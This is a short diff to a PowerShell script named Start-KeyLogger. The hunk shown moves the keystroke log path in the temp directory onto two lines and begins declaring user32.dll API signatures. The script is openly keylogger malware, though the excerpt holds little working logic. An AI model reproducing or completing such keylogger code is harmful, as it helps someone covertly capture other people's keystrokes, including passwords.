@@ -1,7 +1,8 @@
 #requires -Version 2
 function Start-KeyLogger() 
 {
-$Path="$env:temp" + "\keylogger.txt";
+$Path="$env:temp";
+$Path+="\keylogger.txt";
   # Signatures for API Calls
   $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
